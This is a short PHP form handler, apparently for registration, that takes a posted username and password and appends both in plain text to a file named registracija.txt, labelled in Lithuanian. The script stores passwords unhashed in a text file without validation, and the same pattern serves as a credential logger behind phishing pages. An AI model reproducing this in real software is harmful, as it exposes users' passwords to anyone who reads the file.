<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $username = $_POST['username'];
  $password = $_POST['password'];
  
  $data = "Vartotojas: $username, Slaptažodis: $password\n";
  
  $file = fopen("registracija.txt", "a");
  fwrite($file, $data);
  fclose($file);
}
?>